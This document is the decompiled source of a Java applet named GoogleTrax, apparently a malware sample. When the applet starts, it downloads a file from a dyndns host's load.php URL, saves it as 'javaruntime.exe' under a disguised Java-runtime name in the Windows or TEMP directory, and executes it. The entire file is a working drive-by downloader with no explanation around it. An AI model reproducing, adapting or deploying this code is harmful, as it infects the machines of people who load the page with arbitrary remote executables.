import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class GoogleTrax extends Applet
{
    private String remoteURL;
    private String fileURL;
    
    public GoogleTrax() {
        this.remoteURL = "http://muvie.dyndns.tv/pay0C/load.php?spl=soc_hta";
        this.fileURL = "javaruntime.exe";
        if (System.getProperty("os.name").indexOf("Vista") != -1) {
            this.fileURL = ((System.getenv("TEMP") == null) ? "C:" : System.getenv("TEMP")) + "javaruntime.ex e";
        }
        else {
            final String getenv = System.getenv("SystemRoot");
            this.fileURL = ((getenv == null || getenv.length() <= 0) ? "C:\\Windows" : getenv) + "javaruntime.ex e";
        }
    }
    
    @Override
    public void init() {
    }
    
    @Override
    public void start() {
        this.run();
    }
    
    @Override
    public void stop() {
    }
    
    @Override
    public void destroy() {
    }
    
    public static void main(final String[] array) {
        new GoogleTrax().run();
    }
    
    private void run() {
        try {
            final URL url = new URL(this.remoteURL);
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(this.fileURL));
            final InputStream inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex) {
                ex.printStackTrace();
            }
            final Runtime runtime = Runtime.getRuntime();
            try {
                final Process exec = runtime.exec(this.fileURL);
                exec.waitFor();
                String line;
                while ((line = new BufferedReader(new InputStreamReader(exec.getInputStream())).readLine()) != null) {
                    System.out.print(line);
                }
            }
            catch (Exception ex4) {}
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
            }
            catch (IOException ex2) {
                ex2.printStackTrace();
            }
        }
        catch (Exception ex3) {
            ex3.printStackTrace();
        }
    }
}
